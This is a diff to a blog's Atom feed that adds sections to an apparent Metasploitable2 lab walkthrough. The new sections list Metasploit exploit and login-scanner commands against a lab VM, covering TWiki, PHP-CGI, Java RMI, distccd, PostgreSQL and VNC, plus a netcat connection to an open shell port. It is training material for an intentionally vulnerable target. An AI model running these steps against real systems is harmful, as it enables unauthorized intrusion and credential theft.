@@ -4,7 +4,7 @@
   <title><![CDATA[Category: metasploit | Bob1Bob2]]></title>
   <link href="http://wg135.github.io/blog/categories/metasploit/atom.xml" rel="self"/>
   <link href="http://wg135.github.io/"/>
-  <updated>2016-07-05T15:43:18-05:00</updated>
+  <updated>2016-07-06T15:24:16-05:00</updated>
   <id>http://wg135.github.io/</id>
   <author>
     <name><![CDATA[Bob1Bob2]]></name>
@@ -339,6 +339,42 @@ msf auxiliary(telnet_version) &gt; run
 
 <p><img src="/images/blog/misc/metasploitable2/Selection_026.png" title="[title manually exploit [alt text]]" ></p>
 
+<h3>Twiki (port 80)</h3>
+
+<p>Nagviate to port 80. there is a Twiki, search twiki, find a  exploit</p>
+
+<p><code>exploit/unix/webapp/twiki_history</code></p>
+
+<pre><code>msf &gt; use  exploit/unix/webapp/twiki_history
+msf exploit(twiki_history) &gt; set rhost 192.168.79.179
+msf exploit(twiki_history) &gt; exploit
+</code></pre>
+
+<p><img src="/images/blog/misc/metasploitable2/Selection_028.png" title="[title manually exploit [alt text]]" ></p>
+
+<h3>phpinfo.php</h3>
+
+<p>Use nikto, I found the page phpinfo.php is availabe.</p>
+
+<p><img src="/images/blog/misc/metasploitable2/Selection_029.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>I got the php version is 5.2.4.</p>
+
+<p>search the php_cgi</p>
+
+<p>found the exploit <code>exploit/multi/http/php_cgi_arg_injection</code></p>
+
+<p><img src="/images/blog/misc/metasploitable2/Selection_030.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>may be the vulberable version.</p>
+
+<pre><code>msf &gt; use exploit/multi/http/php_cgi_arg_injection
+msf exploit(php_cgi_arg_injection) &gt; set rhost 192.168.79.179
+msf exploit(php_cgi_arg_injection) &gt; exploit
+</code></pre>
+
+<p><img src="/images/blog/misc/metasploitable2/Selection_031.png" title="[title manually exploit [alt text]]" ></p>
+
 <h3>SMB exploit:</h3>
 
 <p>Enumerate smtp:</p>
@@ -399,6 +435,24 @@ msf exploit(unreal_ircd_3281_backdoor) &gt; exploit
 
 <p>in metasploit search rmiregistry, got one exploit</p>
 
+<p><code>exploit/multi/misc/java_rmi_server</code></p>
+
+<pre><code>msf &gt; use exploit/multi/misc/java_rmi_server
+msf exploit(java_rmi_server) &gt; set rhost 192.168.79.17
+msf exploit(java_rmi_server) &gt; exploit
+msf exploit(java_rmi_server) &gt; sessions -i 1
+</code></pre>
+
+<p><img src="/images/blog/misc/metasploitable2/Selection_027.png" title="[title manually exploit [alt text]]" ></p>
+
+<h3>Remote shell (port 1524)</h3>
+
+<p>nothing cool,</p>
+
+<p><code>nc 192.168.79.179 1524</code></p>
+
+<p><img src="/images/blog/misc/metasploitable2/Selection_032.png" title="[title manually exploit [alt text]]" ></p>
+
 <h3>Mysql exploit</h3>
 
 <h4>Discover MySQL version:</h4>
@@ -439,9 +493,64 @@ msf auxiliary(mysql_login) &gt; run
 
 <p><img src="/images/blog/misc/metasploitable2/Selection_012.png" title="[title manually exploit [alt text]]" ></p>
 
+<h3>distccd (port 3632)</h3>
+
+<p>search distccd, find a exploit <code>exploit/unix/misc/distcc_exec</code></p>
+
+<pre><code>use exploit/unix/misc/distcc_exec
+msf exploit(distcc_exec) &gt; set rhost 192.168.79.179
+msf exploit(distcc_exec) &gt; exploit 
+</code></pre>
+
+<p><img src="/images/blog/misc/metasploitable2/Selection_033.png" title="[title manually exploit [alt text]]" ></p>
+
+<h3>PostgreSQL (port 5432)</h3>
+
+<p>search postgresql, find a module <code>auxiliary/scanner/postgres/postgres_login</code></p>
+
+<pre><code>msf &gt; use auxiliary/scanner/postgres/postgres_login
+msf auxiliary(postgres_login) &gt; set  RHOSTS 192.168.79.179
+msf auxiliary(postgres_login) &gt; run
+</code></pre>
+
+<p><img src="/images/blog/misc/metasploitable2/Selection_034.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>find username/password, login to postgresql.</p>
+
+<p><code>psql -h 192.168.79.179 -U postgres</code></p>
+
+<p><img src="/images/blog/misc/metasploitable2/Selection_035.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>There is another exploit: <code>exploit/linux/postgres/postgres_payload</code></p>
+
+<pre><code>msf &gt; use exploit/linux/postgres/postgres_payload
+msf exploit(postgres_payload) &gt; set rhost 192.168.79.17
+msf exploit(postgres_payload) &gt; exploit
+</code></pre>
+
+<p><img src="/images/blog/misc/metasploitable2/Selection_036.png" title="[title manually exploit [alt text]]" ></p>
+
+<h3>VNC (port 5900)</h3>
+
+<p>search vnc, find a <code>auxiliary/scanner/vnc/vnc_login</code></p>
+
+<pre><code>msf &gt; use auxiliary/scanner/vnc/vnc_login
+msf auxiliary(vnc_login) &gt; set rhosts 192.168.79.179
+msf auxiliary(vnc_login) &gt; run
+</code></pre>
+
+<p>find a password:
+<img src="/images/blog/misc/metasploitable2/Selection_037.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>use this password to login vnc</p>
+
+<p><code>vncviewer 192.168.79.179</code></p>
+
+<p><img src="/images/blog/misc/metasploitable2/Selection_038.png" title="[title manually exploit [alt text]]" ></p>
+
 <h3>Exploit Apache Tomcat (port 8180)</h3>
 
-<p>use Nikto  to scan</p>
+<p>use Nikto to scan</p>
 
 <p><code>nikto -h 182.168.79.179:8180</code></p>
 
